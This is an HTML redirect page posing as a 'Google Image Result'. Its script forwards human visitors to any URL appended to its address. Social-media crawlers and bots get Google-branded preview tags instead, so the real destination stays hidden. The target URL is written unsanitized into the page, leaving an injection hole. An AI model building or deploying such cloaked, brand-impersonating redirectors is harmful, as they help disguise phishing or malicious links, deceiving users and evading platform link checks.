
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Google Image Result</title>
    
    <script>
        // بيقرا الرابط الطويل اللي المتابع ضغط عليه
        let fullPath = window.location.href;
        let splitIndex = fullPath.indexOf("http", 8); 
        let targetUrl = splitIndex !== -1 ? fullPath.substring(splitIndex) : "https://images.app.goo.gl/UeieYqv4rGmwTHg9A";

        let userAgent = navigator.userAgent || "";
        let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector|bot|crawler|spider|scraper/i.test(userAgent);

        if (isBot) {
            document.write(`
                <!DOCTYPE html>
                <html lang="ar">
                <head>
                    <meta charset="UTF-8">
                    <title>Google Image Result</title>
                    <meta property="og:title" content="Google Image Result" />
                    <meta property="og:image" content="${targetUrl}" />
                    <meta property="og:url" content="${targetUrl}" />
                    <meta property="og:type" content="website" />
                    <meta http-equiv="refresh" content="0;url=${targetUrl}">
                </head>
                <body></body>
                </html>
            `);
        } else {
            window.location.replace(targetUrl);
        }
    </script>
</head>
<body>
    <p>جاري التحويل...</p>
</body>
</html>
